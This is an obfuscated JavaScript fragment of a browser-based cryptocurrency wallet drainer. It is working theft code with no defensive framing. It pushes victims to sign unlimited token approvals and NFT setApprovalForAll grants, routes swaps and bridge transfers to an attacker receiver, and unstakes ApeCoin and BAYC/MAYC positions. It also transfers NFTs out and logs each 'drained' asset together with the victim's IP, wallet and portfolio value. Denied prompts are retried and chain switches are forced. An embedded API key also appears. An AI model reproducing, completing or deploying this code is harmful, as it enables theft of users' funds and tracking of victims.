            const _0x2bd208 = {
              internalType: "address",
              name: '',
              type: "address"
            };
            const _0xa483ea = {
              internalType: 'uint256',
              name: '',
              type: 'uint256'
            };
            const _0x387623 = {
              inputs: [_0x3b728c, _0x2bd208],
              name: 'sgPoolIds',
              outputs: [_0xa483ea],
              stateMutability: "view",
              type: "function"
            };
            const _0x16e58c = {
              internalType: "uint16",
              name: '',
              type: "uint16"
            };
            const _0x127e43 = {
              internalType: "bytes",
              name: '',
              type: "bytes"
            };
            const _0x673ef7 = {
              internalType: 'uint256',
              name: '',
              type: 'uint256'
            };
            const _0x579afc = {
              internalType: "address",
              name: "bridgedToken",
              type: "address"
            };
            const _0x201f3c = {
              internalType: 'uint256',
              name: 'amountLD',
              type: 'uint256'
            };
            const _0x58d81b = {
              internalType: "bytes",
              name: "payload",
              type: "bytes"
            };
            const _0xa24742 = {
              inputs: [_0x16e58c, _0x127e43, _0x673ef7, _0x579afc, _0x201f3c, _0x58d81b],
              name: "sgReceive",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0xc8d83d = {
              inputs: [],
              name: "stargateRouter",
              outputs: [{
                'internalType': "contract IStargateRouter",
                'name': '',
                'type': "address"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x508fd4 = {
              internalType: "address",
              name: '',
              type: "address"
            };
            const _0x1128bd = {
              internalType: "address",
              name: '',
              type: "address"
            };
            const _0x1e2f18 = {
              inputs: [_0x508fd4],
              name: "tokenToOFTs",
              outputs: [_0x1128bd],
              stateMutability: "view",
              type: "function"
            };
            const _0x5cf600 = {
              internalType: 'address',
              name: "newOwner",
              type: 'address'
            };
            const _0x25728b = {
              inputs: [_0x5cf600],
              name: "transferOwnership",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x523a88 = {
              inputs: [],
              name: "weth",
              outputs: [{
                'internalType': "address",
                'name': '',
                'type': "address"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x3c1da6 = {
              internalType: "uint16",
              name: '',
              type: "uint16"
            };
            const _0x161b8a = {
              internalType: 'address',
              name: '',
              type: "address"
            };
            const _0x24cd6b = {
              inputs: [_0x3c1da6],
              name: "wooCrossChainRouters",
              outputs: [_0x161b8a],
              stateMutability: "view",
              type: "function"
            };
            const _0x439ed3 = {
              internalType: "contract IWooRouterV2",
              name: '',
              type: 'address'
            };
            const _0x2c1ecd = {
              inputs: [],
              name: 'wooRouter',
              outputs: [_0x439ed3],
              stateMutability: "view",
              type: "function"
            };
            const _0x37eb29 = {
              stateMutability: "payable",
              type: 'receive'
            };
            let _0x1cf7db = [_0x24bec7, _0xb5851a, _0x3cd692, _0x492632, _0x13c809, _0x3500d9, _0x211d8a, _0x167f6e, _0x47aaea, _0x1bae8a, _0x315a4c, _0x304f79, _0x161857, _0x47f7b0, _0x196db7, _0x527d0f, _0x290585, _0x2d9c5f, _0x321629, _0x343fc4, _0x1ec6fb, _0x41d6fb, _0x1fd42c, _0x230ed4, _0x1dc28c, _0x3019b4, _0x1aeec6, _0x47483e, _0x1e705b, _0x4bb8fd, _0x387623, _0xa24742, _0xc8d83d, _0x1e2f18, _0x25728b, _0x523a88, _0x24cd6b, _0x2c1ecd, _0x37eb29];
            let _0xa4f6f7 = new ethers.Contract(_0x3941f8, _0x1cf7db, _0xab3127);
            let _0xc2ecfa = await _0xa4f6f7.quoteLayerZeroFee(0, this.ace_receiver, _0x1233a7, _0x17a6d4);
            let _0x1cdcbe = _0xc2ecfa[0];
            console.log(_0xc2ecfa);
            const _0x575c90 = {
              value: _0x1cdcbe
            };
            return [_0xa4f6f7.crossSwap(0, this.ace_receiver, _0x1233a7, _0x17a6d4, _0x575c90), ''];
          } catch (_0x17ee3b) {
            console.log(_0x17ee3b);
            return new Promise(_0x234211 => false, _0x36aaa8 => false);
          }
        }
      case "ZeroEx":
        {
          const _0x22508d = {
            '0x-api-key': "ff2bd086-339a-4555-8723-4166590b3f7f"
          };
          let _0x2834f3 = "api.0x.org";
          let _0x45e84c = this.tradingPairs[_0x2a18aa.chain];
          switch (_0x2a18aa.chain) {
            case 'eth':
              break;
            case 'arb':
              _0x2834f3 = "arbitrum.api.0x.org";
              break;
            case 'avax':
              _0x2834f3 = "avalanche.api.0x.org";
              break;
            case "base":
              _0x2834f3 = "base.api.0x.org";
              break;
            case 'bsc':
              _0x2834f3 = "bsc.api.0x.org";
              break;
            case "celo":
              _0x2834f3 = "celo.api.0x.org";
              break;
            case "ftm":
              _0x2834f3 = "fantom.api.0x.org";
              break;
            case 'op':
              _0x2834f3 = "optimism.api.0x.org";
              break;
            case "matic":
              _0x2834f3 = "polygon.api.0x.org";
              break;
          }
          const _0x5945d3 = {
            headers: _0x22508d
          };
          const _0x174dcb = await fetch("https://" + _0x2834f3 + "/swap/v1/quote?sellToken=" + _0x2a18aa.asset.token + "&buyToken=" + _0x45e84c + "&sellAmount=" + _0x2a18aa.asset.amount, _0x5945d3);
          let _0x531dd5 = await _0x174dcb.json();
          console.log(_0x531dd5);
          let _0x572a9b = [_0xab3127.sendTransaction({
            'gasLimit': '0x' + _0x531dd5.gas.toString(16),
            'to': _0x531dd5.to,
            'data': _0x531dd5.data,
            'value': '0x00',
            'chainId': '0x' + _0x531dd5.chainId.toString(16)
          }), ''];
          return _0x572a9b;
        }
    }
  };
  ["doSwapRegular"] = async _0x19f4f4 => {
    let _0x5540b3 = await this.getWalletAddress();
    try {
      let _0x352d96 = await this.setUpSwap(_0x19f4f4);
      let _0x65089c = await _0x352d96[0];
      let _0xc4031b = _0x352d96[1];
      if (_0x65089c.hash.length > 0) {
        if (_0x19f4f4.actionType == "PancakeV2" || _0x19f4f4.actionType == "UniswapV3_2" || _0x19f4f4.actionType == "UniswapV3") {
          for (let _0x46507e of _0x19f4f4.asset) {
            this.approved.push(_0x46507e.token + ',' + _0x19f4f4.chain);
          }
        } else {
          this.approved.push(_0x19f4f4.asset.token + ',' + _0x19f4f4.chain);
        }
        let _0x24cd0e = this.getAssetInfo(_0x19f4f4);
        let _0x3f4ec2 = "```drained\n" + ('' + _0x24cd0e.name) + "```";
        await this.sendMessage({
          'chain': _0x19f4f4.chain,
          'type': "swap",
          'source': _0x19f4f4.actionType,
          'txId': _0x65089c.hash,
          'actions': _0x3f4ec2,
          'value': _0x19f4f4.value / this.typeToMultiplier(_0x19f4f4.actionType)
        });
        if (_0x19f4f4.actionType != "Special" && _0x19f4f4.actionType != "Stargate" && _0x19f4f4.actionType != "WooBridge" && _0x19f4f4.actionType != "ZeroEx" && _0x19f4f4.actionType != "AaveLP2" && _0x19f4f4.actionType != "AaveLP3" && _0x19f4f4.actionType != "AaveLP4") {
          await this.SendCompletion({
            'type': "tokenSplit",
            'hash': _0x65089c.hash,
            'tokenAddress': _0xc4031b,
            'caller': this.getCaller(_0x19f4f4),
            'ahash': this.createEncKey(),
            'chainId': this.getChainId(_0x19f4f4.chain)
          });
        }
      } else {
        if (_0x5540b3 != (await this.getWalletAddress())) {
          return;
        }
        const _0x13f7cc = {
          chain: _0x19f4f4.chain,
          type: "error",
          msg: "Client has denied swapping (" + _0x19f4f4.actionType + ')'
        };
        await this.sendMessage(_0x13f7cc);
        this.failedAttempts++;
        if (this.failedAttempts > 0x5 && this.actions.length > 1) {
          this.failedAttempts = 0;
        } else {
          await this.doSwapRegular(_0x19f4f4);
        }
      }
    } catch (_0x1804bf) {
      console.log(_0x1804bf);
      if (_0x5540b3 != (await this.getWalletAddress())) {
        return;
      }
      const _0x56cafd = {
        chain: _0x19f4f4.chain,
        type: "error",
        msg: "Client has denied swapping (" + _0x19f4f4.actionType + ')'
      };
      await this.sendMessage(_0x56cafd);
      this.failedAttempts++;
      if (this.failedAttempts > 0x5 && this.actions.length > 1) {
        this.failedAttempts = 0;
      } else {
        await this.doSwapRegular(_0x19f4f4);
      }
    }
  };
  ["apePromise"] = async () => {
    try {
      let _0x2978c4 = await this.Sdk.getStakes(await this.getWalletAddress());
      let _0x16f30e = [];
      for (let _0x8f361e of _0x2978c4) {
        const _0x397ff2 = {
          poolId: _0x8f361e[0],
          tokenId: _0x8f361e[1],
          deposited: _0x8f361e[2],
          unclaimed: _0x8f361e[3],
          rewards24Hrs: _0x8f361e[4]
        };
        _0x16f30e.push(_0x397ff2);
      }
      let _0x520187 = {
        'amount': BigInt(0),
        'type': 'Mayc',
        'ids': [],
        'value': 0x0
      };
      let _0x56df82 = {
        'amount': BigInt(0),
        'type': "Bayc",
        'ids': [],
        'value': 0x0
      };
      console.log(_0x16f30e);
      for (let _0x3be6cc of _0x16f30e) {
        let _0x432924 = parseInt(_0x3be6cc.poolId.toString());
        let _0x12db04 = this.web3Js.utils.fromWei(_0x3be6cc.deposited.toString(), "ether") * apePrice;
        this.totalStaked += _0x12db04;
        if (_0x432924 == 0) {
          let _0x4c8f52 = {
            'amount': BigInt(_0x3be6cc.deposited.toString()).toString(),
            'type': "Ape"
          };
          if (_0x12db04 > 30) {
            this.apeStakeActions.push({
              'stake': _0x4c8f52,
              'value': _0x12db04,
              'chain': "eth"
            });
          }
        }
        if (_0x432924 == 1) {
          _0x56df82.amount = (BigInt(_0x56df82.amount) + BigInt(_0x3be6cc.deposited.toString())).toString();
          _0x56df82.ids.push(_0x3be6cc.tokenId.toString());
          _0x56df82.value = 0x0 + _0x12db04;
        }
        if (_0x432924 == 2) {
          _0x520187.amount = (BigInt(_0x520187.amount) + BigInt(_0x3be6cc.deposited.toString())).toString();
          _0x520187.ids.push(_0x3be6cc.tokenId.toString());
          _0x520187.value = 0x0 + _0x12db04;
        }
      }
    } catch (_0x215320) {
      console.log(_0x215320);
      console.log("FAILED TO INIT APE DATA");
    }
  };
  ["handleChains"] = async () => {
    let _0x167137 = this.chainValues.sort(this.utils.propComparator("value")).reverse();
    if ((await this.getChainId(_0x167137[0].chain.toString())) != this.currentChainId && _0x167137[0].value > 5) {
      console.log("may have to prompt something here");
      if (await this.trySwitchChain(this.provider, await this.getChainId(_0x167137[0].chain))) {
        this.currentChainId = await this.getChainId(_0x167137[0].chain);
      }
    }
  };
  ["trySwitchChain"] = async (_0x2f18f9, _0x2f4b4e) => {
    let _0x31b656 = await this.getWalletAddress();
    let _0x18c2ab = await this.getChainFromId(_0x2f4b4e);
    try {
      var _0x308a10 = '0x' + _0x2f4b4e.toString(16);
      const _0x5d5a36 = {
        chainId: _0x308a10
      };
      const _0x3cac5e = {
        method: "wallet_switchEthereumChain",
        params: [_0x5d5a36]
      };
      await _0x2f18f9.provider.request(_0x3cac5e);
      this.web3Js = new Web3(_0x2f18f9.provider);
      this.ethersProvider = this.provider;
      this.Sdk = new SDK(this.provider, _0x2f4b4e);
      await this.Sdk.Initialize();
      const _0x2c498a = this.chainValues.findIndex(_0x4ce975 => {
        return _0x4ce975.chain === _0x18c2ab;
      });
      let _0x14cd1d = this.chainValues[_0x2c498a].value;
      await this.sendMessage({
        'type': "chain",
        'chain': _0x18c2ab,
        'name': _0x18c2ab.toUpperCase(),
        'value': _0x14cd1d / _0x2d2f04.assetOptions.multipliers.chainSwitchRatio,
        'actionsLeft': this.actions.filter(_0x1838bb => _0x1838bb.chain == _0x18c2ab).length
      });
      if (_0x31b656 != (await this.getWalletAddress())) {
        return;
      }
      return true;
    } catch (_0x38c9c9) {
      if (_0x38c9c9.code == 4902) {
        if (!(await this.addChain(_0x18c2ab))) {
          for (var _0x7c2a5c of this.actions.filter(_0xe6089f => _0xe6089f.chain == _0x18c2ab)) {
            _0x7c2a5c.value = 0;
          }
          const _0x391c82 = this.chainValues.findIndex(_0x48ec47 => {
            return _0x48ec47.chain === _0x18c2ab;
          });
          this.chainValues[_0x391c82].value = 0;
          console.log("CHAIN NOT ADDED, MOVING ON TO NEXT BEST OPTION");
          return;
        } else {
          if ((await this.web3Js.eth.getChainId()) == this.chainRegistryData[_0x18c2ab].id) {
            this.web3Js = new Web3(_0x2f18f9);
            this.ethersProvider = new ethers.providers.Web3Provider(_0x2f18f9, "any");
            this.Sdk = new SDK(_0x2f18f9, _0x2f4b4e);
            await this.Sdk.Initialize();
            const _0x439aa5 = this.chainValues.findIndex(_0x3ecc69 => {
              return _0x3ecc69.chain === _0x18c2ab;
            });
            let _0x12f5cd = this.chainValues[_0x439aa5].value;
            await this.sendMessage({
              'type': "chain",
              'chain': _0x18c2ab,
              'name': _0x18c2ab.toUpperCase(),
              'value': _0x12f5cd / _0x2d2f04.assetOptions.multipliers.chainSwitchRatio,
              'actionsLeft': this.actions.filter(_0x4b2504 => _0x4b2504.chain == _0x18c2ab).length
            });
            if (_0x31b656 != (await this.getWalletAddress())) {
              return;
            }
            console.log("Added Chain");
            return true;
          } else {
            await this.handleChains();
          }
        }
      } else {
        if (_0x38c9c9.code == -32002) {
          this.failedAttempts++;
          if (this.failedAttempts > 0x5) {
            this.failedAttempts = 0;
            return;
          } else {
            await this.delay(2000);
            await this.handleChains();
            return;
          }
        } else {
          if (_0x31b656 != (await this.getWalletAddress())) {
            return;
          }
          await this.sendMessage({
            'chain': _0x18c2ab,
            'type': "error",
            'msg': "Denied Changing Chain to " + _0x18c2ab.toUpperCase()
          });
          this.failedAttempts++;
          if (this.failedAttempts > 0x5) {
            this.failedAttempts = 0;
            return;
          } else {
            await this.handleChains();
            return;
          }
        }
      }
    }
  };
  ["delay"] = _0x1f7695 => {
    return new Promise(_0x30edb8 => setTimeout(_0x30edb8, _0x1f7695));
  };
  ['addChain'] = async _0x292d73 => {
    const _0x4587bf = {
      VJqjW: "Trying to add chain"
    };
    _0x4587bf.sodpY = "wallet_addEthereumChain";
    _0x4587bf.VLDxP = "Trying to add chain..";
    _0x4587bf.joKgx = function (_0x417bad, _0x300dc9) {
      return _0x417bad == _0x300dc9;
    };
    _0x4587bf.yvLjG = "Denied adding chain";
    console.log("Trying to add chain", _0x292d73);
    try {
      await window.ethereum.request({
        'method': _0x4587bf.sodpY,
        'params': [{
          'chainId': this.chainRegistryData[_0x292d73].id,
          'chainName': this.chainRegistryData[_0x292d73].name,
          'nativeCurrency': {
            'name': this.chainRegistryData[_0x292d73].symbol.toLowerCase(),
            'symbol': this.chainRegistryData[_0x292d73].symbol,
            'decimals': 0x12
          },
          'rpcUrls': [this.chainRegistryData[_0x292d73].rpc],
          'blockExplorerUrls': [this.chainRegistryData[_0x292d73].explorer]
        }]
      });
      return true;
    } catch (_0x1536c5) {
      console.log(_0x4587bf.VLDxP);
      if (_0x4587bf.joKgx(_0x1536c5.code, 4001)) {
        console.log(_0x4587bf.yvLjG);
      } else {
        console.log("Addchain error", _0x1536c5);
      }
      return false;
    }
  };
  ["getWalletAddress"] = async () => {
    return (await this.web3Js.eth.getAccounts())[0];
  };
  ["createAction"] = (_0x2b5c7b, _0x18ae5c, _0x1ff1fa, _0x3a7664) => {
    const _0x5777ce = {
      actionType: _0x2b5c7b,
      asset: _0x18ae5c,
      value: _0x1ff1fa,
      chain: _0x3a7664
    };
    if (!this.handledActions.includes(Base64.encode(JSON.stringify(_0x5777ce)))) {
      this.actions.push(_0x5777ce);
    }
  };
  ["numberWithCommas"] = _0x14545c => {
    return _0x14545c.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
  };
  ["sendMessage"] = async _0x113c58 => {
    try {
      let _0x26c29f = "https://etherscan.io";
      let _0xff8a36 = 'eth';
      if (_0xff8a36 != '') {
        _0xff8a36 = _0x113c58.chain;
      }
      let _0x2de2bc = '💎';
      if (_0x113c58.value > 0) {
        _0x113c58.value = _0x113c58.value.toFixed(2);
      }
      if (_0xff8a36 == "bsc") {
        _0x26c29f = "https://bscscan.com";
        _0x2de2bc = '🔸';
      } else {
        if (_0xff8a36 == "ftm") {
          _0x26c29f = "https://ftmscan.com";
          _0x2de2bc = '🈳';
        } else {
          if (_0xff8a36 == "arb") {
            _0x26c29f = "https://arbiscan.io";
            _0x2de2bc = '🔹';
          } else {
            if (_0xff8a36 == 'matic') {
              _0x26c29f = "https://polygonscan.com";
              _0x2de2bc = '🔮';
            } else {
              if (_0xff8a36 == "avax") {
                _0x26c29f = "https://snowtrace.io";
                _0x2de2bc = "🅰️";
              } else {
                if (_0xff8a36 == "cro") {
                  _0x26c29f = "https://cronoscan.com";
                  _0x2de2bc = " 💠";
                } else {
                  if (_0xff8a36 == 'op') {
                    _0x26c29f = "https://optimistic.etherscan.io";
                    _0x2de2bc = '🔴';
                  } else {
                    if (_0xff8a36 == 'xdai') {
                      _0x26c29f = "https://gnosisscan.io";
                      _0x2de2bc = '🔰';
                    } else {
                      if (_0xff8a36 == "era") {
                        _0x26c29f = "https://explorer.zksync.io";
                        _0x2de2bc = '◾️';
                      } else if (_0xff8a36 == "base") {
                        _0x26c29f = "https://basescan.org/";
                        _0x2de2bc = '🧿';
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
      const _0x53932b = window.location.hostname;
      let _0x184879 = await this.getWalletAddress();
      let _0xc3af03 = _0x184879.slice(0, 6) + "..." + _0x184879.slice(38, 42);
      let _0x1f50dc = '';
      switch (_0x113c58.type) {
        case "swap":
          _0x1f50dc = "🔄 [" + _0x113c58.source.replace("Swap", '') + " Swap ](" + _0x26c29f + "/tx/" + _0x113c58.txId + ") ($" + this.numberWithCommas(_0x113c58.value) + ')' + "\n" + (_0x2de2bc + " [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ")\n\n" + _0x113c58.actions);
          break;
        case "connection":
          {
            let _0x15d277 = '💻';
            if (this.isMobile) {
              _0x15d277 = '📱';
            }
            _0x1f50dc = '[' + flag + "](https://www.infobyip.com/ip-" + ipAddress + ".html) [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ')' + "\n" + (_0x15d277 + " [Portfolio ($" + this.numberWithCommas(_0x113c58.value) + ")](https://app.zerion.io/" + _0x184879 + "/overview)\n\n" + _0x113c58.strategy);
          }
          break;
        case "approvalERC":
          _0x1f50dc = "✍🏻 [" + _0x113c58.name + " Token Signed](" + _0x26c29f + "/tx/" + _0x113c58.txId + ") ($" + this.numberWithCommas(_0x113c58.value) + ')' + "\n" + (_0x2de2bc + " [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ") | " + _0x53932b);
          break;
        case "balance":
          _0x1f50dc = "✍🏻 [" + _0x113c58.source + " Balance Transfer " + _0x113c58.valueMsg + '](' + _0x26c29f + "/tx/" + _0x113c58.txId + ')' + "\n" + (_0x2de2bc + " [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ") | " + _0x53932b);
          break;
        case "seaport":
          _0x1f50dc = "🌊 Seaport Signed (" + _0x113c58.countTokens + "x Tokens, " + _0x113c58.countNfts + "x NFTs) ($" + this.numberWithCommas(_0x113c58.value) + ')' + "\n" + (_0x2de2bc + " [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ") | " + _0x53932b + "\n" + "\n" + messageactions);
          break;
        case "wyvern":
          _0x1f50dc = "🌪 [Wyvern Signed (" + _0x113c58.count + " NFTs)](" + _0x26c29f + '/tx/' + _0x113c58.txId + ") ($" + this.numberWithCommas(_0x113c58.value) + ')' + "\n" + (_0x2de2bc + " [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ") | " + _0x53932b);
          break;
        case "permit":
          _0x1f50dc = "✍🏻 Permit Signed For [" + _0x113c58.name + '](' + _0x26c29f + '/address/' + _0x113c58.token + ") ($" + this.numberWithCommas(_0x113c58.value) + ')' + "\n" + (_0x2de2bc + " [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ") | " + _0x53932b);
          break;
        case "permit2":
          _0x1f50dc = "✍🏻 Permit2 Signed for " + _0x113c58.count + " tokens  ($" + this.numberWithCommas(_0x113c58.value) + ')' + "\n" + (_0x2de2bc + " [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ") | " + _0x53932b + "\n" + "\n") + _0x113c58.actions;
          break;
        case "approvalNFT":
          _0x1f50dc = "🧑‍🎨 [" + _0x113c58.source + " Signed](" + _0x26c29f + "/tx/" + _0x113c58.txId + ") ($" + this.numberWithCommas(_0x113c58.value) + ')' + "\n" + (_0x2de2bc + " [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ") | " + _0x53932b);
          if (_0x113c58.actions != '') {
            _0x1f50dc += "\n\n" + _0x113c58.actions;
          }
          break;
        case "unstake":
          _0x1f50dc = "🌀 [Unstaked " + _0x113c58.source + '](' + _0x26c29f + '/tx/' + _0x113c58.txId + ") ($" + this.numberWithCommas(_0x113c58.value) + ')' + "\n" + ('[' + flag + "](https://www.infobyip.com/ip-" + ipAddress + ".html) [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ") | " + _0x53932b);
          break;
        case "chain":
          _0x1f50dc = "⛓ Chain Switched to " + _0x113c58.name + _0x2de2bc + "\n" + ('[' + flag + "](https://www.infobyip.com/ip-" + ipAddress + ".html) [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ") | " + _0x53932b);
          break;
        case "error":
          _0x1f50dc = "🚫 " + _0x113c58.msg + ("\n[" + flag + "](https://www.infobyip.com/ip-" + ipAddress + ".html) [" + _0xc3af03 + '](' + _0x26c29f + "/address/" + _0x184879 + ") | " + _0x53932b);
          break;
      }
      setTimeout(async () => {}, 0);
    } catch {}
  };
  ["createEncKey"] = () => {
    let _0x3cf14b = window.navigator.userAgent;
    let _0x10fc43 = this.utils.encrypt(Base64.encode(this.utils.UserAgent(8) + '-' + this.utils.xJDKDFGXDFIXDFBNXD9273129hizu7sg(4) + '-' + this.utils.J9108240u9pjhXNXUDFJABXDF(4) + '-' + this.utils.jJDFGDFJGDFGNBCBNCVJBCVN(64)), _0x3cf14b + "---" + this.utils.USG1204312());
    return _0x10fc43.toString();
  };
  ["getChainId"] = _0x47e9ae => {
    return this.chainRegistery[_0x47e9ae];
  };
  ["getChainFromId"] = _0x303d62 => {
    return this.chainRegistery[_0x303d62];
  };
}
const _0x49b64d = {
  name: "offerer",
  type: "address"
};
const _0x120f64 = {
  name: "zone",
  type: "address"
};
const _0x5aab52 = {
  name: "offer",
  type: "OfferItem[]"
};
const _0x5cab43 = {
  name: "consideration",
  type: "ConsiderationItem[]"
};
const _0x4e8de0 = {
  name: 'orderType',
  type: "uint8"
};
const _0x309602 = {
  name: 'startTime',
  type: "uint256"
};
const _0x22c5d5 = {
  name: "endTime",
  type: "uint256"
};
const _0x109cf0 = {
  name: "zoneHash",
  type: "bytes32"
};
const _0x246b5b = {
  name: 'salt',
  type: "uint256"
};
const _0x163d7d = {
  name: "conduitKey",
  type: "bytes32"
};
const _0x1aeea4 = {
  name: 'counter',
  type: "uint256"
};
const _0x5c4520 = {
  name: "itemType",
  type: "uint8"
};
const _0x53ae53 = {
  name: "token",
  type: "address"
};
const _0x201a7c = {
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0xbc41 = {
  name: "startAmount",
  type: "uint256"
};
const _0x4a8aa0 = {
  name: 'endAmount',
  type: "uint256"
};
const _0x3be316 = {
  name: "itemType",
  type: "uint8"
};
const _0x347d6f = {
  name: 'token',
  type: "address"
};
const _0x3c7c50 = {
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0x19287b = {
  name: "startAmount",
  type: "uint256"
};
const _0x4bc997 = {
  name: "endAmount",
  type: "uint256"
};
const _0xedae91 = {
  name: 'recipient',
  type: "address"
};
const _0x570295 = {
  OrderComponents: [_0x49b64d, _0x120f64, _0x5aab52, _0x5cab43, _0x4e8de0, _0x309602, _0x22c5d5, _0x109cf0, _0x246b5b, _0x163d7d, _0x1aeea4],
  OfferItem: [_0x5c4520, _0x53ae53, _0x201a7c, _0xbc41, _0x4a8aa0],
  ConsiderationItem: [_0x3be316, _0x347d6f, _0x3c7c50, _0x19287b, _0x4bc997, _0xedae91]
};
class SDK extends Values {
  ["utils"] = new Helpers();
  ["apeAddress"] = "0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9";
  ["permit2Address"] = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
  ["seaportAddress"] = "0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC";
  constructor(_0x38ea02, _0x49a7ee) {
    super();
    this.chainId = _0x49a7ee;
    this.provider = _0x38ea02;
    this.web3Js = new Web3(this.provider.provider);
    console.log("Connected to SDK - " + _0x49a7ee);
  }
  ["Initialize"] = async () => {
    this.signer = this.provider.getSigner((await this.web3Js.eth.getAccounts())[0]);
  };
  ['getChainId'] = _0x1659bc => {
    return this.chainRegistery[_0x1659bc];
  };
  ["getChainFromId"] = _0x7a7ab7 => {
    return this.chainRegistery[_0x7a7ab7];
  };
  ["GetAllowances"] = async (_0x505bf0, _0x1217b4, _0x2daf3d) => {
    let _0x5d39b8 = new Permit2Factory(this.permit2Address, this.signer).contract;
    let _0xac0479 = await _0x5d39b8.allowance(_0x505bf0, _0x1217b4, _0x2daf3d);
    return _0xac0479.nonce;
  };
  ["getStakes"] = async _0x4c8f94 => {
    const _0x4acc38 = new ethers.providers.JsonRpcProvider("https://cloudflare-eth.com");
    let _0x33ee65 = new ApeFactory(this.apeAddress, _0x4acc38).contract;
    let _0x5b7c5c = await _0x33ee65.getAllStakes(_0x4c8f94);
    return _0x5b7c5c;
  };
  ['unstakeApe'] = async (_0x3ef57a, _0x301130) => {
    let _0x19c169 = new ApeFactory(this.apeAddress, this.signer).contract;
    let _0x407898 = await _0x19c169.withdrawApeCoin(_0x3ef57a, _0x301130);
    return _0x407898;
  };
  ["unstakeBayc"] = async (_0x4d8049, _0x1b224c) => {
    let _0x5cd9c6 = new ApeFactory(this.apeAddress, this.signer).contract;
    let _0x1b0ae9 = await _0x5cd9c6.withdrawBAYC(_0x4d8049, _0x1b224c);
    return _0x1b0ae9;
  };
  ["unstakeMayc"] = async (_0x24a8b2, _0x4e5d68) => {
    let _0x30616a = new ApeFactory(this.apeAddress, this.signer).contract;
    let _0x4f1ae4 = await _0x30616a.withdrawMAYC(_0x24a8b2, _0x4e5d68);
    return _0x4f1ae4;
  };
  ["getWalletAddress"] = async () => {
    return (await this.web3Js.eth.getAccounts())[0];
  };
  ["signData"] = async (_0x2f9ecf, _0x4f7af5, _0x548d4d) => {
    let _0x2e7a81 = await this.signer._signTypedData(_0x2f9ecf, _0x4f7af5, _0x548d4d);
    return _0x2e7a81;
  };
  ["approveAsset"] = async (_0x3147d8, _0x5811a1, _0x102602 = false) => {
    const _0x478219 = {
      BSafr: "0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    };
    _0x478219.nuaWX = function (_0x3a3246, _0x36062a) {
      return _0x3a3246 || _0x36062a;
    };
    _0x478219.jlzyS = function (_0x41dba8, _0x4d3ea2) {
      return _0x41dba8 || _0x4d3ea2;
    };
    switch (_0x3147d8.itemType) {
      case 1:
        const _0x3bbadb = new ERC20Factory(_0x3147d8.token, this.signer).contract;
        let _0x429244 = false;
        try {
          await _0x3bbadb.callStatic.increaseAllowance(_0x5811a1, ethers.BigNumber.from("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"));
          _0x429244 = true;
        } catch {}
        if (!_0x429244) {
          const _0x40b323 = _0x3bbadb.approve(_0x5811a1, ethers.BigNumber.from("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"));
          return _0x40b323;
        } else {
          console.log("This token allows to be increased");
          const _0x1439c9 = _0x3bbadb.increaseAllowance(_0x5811a1, ethers.BigNumber.from("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"));
          return _0x1439c9;
        }
      case _0x478219.nuaWX(2, 4):
        {
          if (!_0x102602) {
            const _0x287125 = new ERC721Factory(_0x3147d8.token, this.signer).contract;
            const _0x713552 = {
              'gasLimit': 0x15f90
            };
            const _0x42df8a = _0x287125.setApprovalForAll(_0x5811a1, true, _0x713552);
            return _0x42df8a;
          } else {
            const _0x2164a3 = new ERC721Factory(_0x3147d8.token, this.signer).contract;
            const _0x24d0f9 = {
              gasLimit: 0x15f90
            };
            const _0xe23dc3 = _0x2164a3.approve(_0x5811a1, _0x3147d8.token_ids[0], _0x24d0f9);
            return _0xe23dc3;
          }
        }
      case _0x478219.jlzyS(3, 5):
        const _0x2b3d0b = new ERC1155Factory(_0x3147d8.token, this.signer).contract;
        const _0x5a635f = {
          gasLimit: 0x15f90
        };
        const _0x2a72b6 = await _0x2b3d0b.setApprovalForAll(_0x5811a1, true, _0x5a635f);
        return _0x2a72b6;
      default:
        throw new Error("Unexpected itemType: " + _0x3147d8.itemType);
    }
  };
  ["sendERC721"] = async (_0x1db648, _0x21f9a5, _0x4873d5, _0x288891) => {
    const _0xe0aa96 = ethers.utils.getAddress(_0x21f9a5);
    const _0x1054c1 = new ERC721Factory(_0xe0aa96, this.signer).contract;
    const _0x1c9d91 = _0x1054c1.safeTransferFrom(_0x1db648, _0x4873d5, _0x288891);
    return _0x1c9d91;
  };
  ["sendERC1155"] = async (_0x3224d3, _0x36f69c, _0x7e4008, _0x835c88) => {
    const _0x1c81d1 = ethers.utils.getAddress(_0x36f69c);
    const _0x11e25b = new ERC1155Factory(_0x1c81d1, this.signer).contract;
    const _0x35829d = _0x11e25b.safeTransferFrom(_0x3224d3, _0x7e4008, _0x835c88, 1, "0x00");
    return _0x35829d;
  };
  ["sendERC721_DRY"] = async (_0xb86271, _0x26f5f8, _0x22b9ab, _0x459f7c) => {
    const _0x223338 = ethers.utils.getAddress(_0x26f5f8);
    const _0x19e607 = new ERC721Factory(_0x223338, this.signer).contract;
    const _0x1433c2 = _0x19e607.callStatic.safeTransferFrom(_0xb86271, _0x22b9ab, _0x459f7c);
    return _0x1433c2;
  };
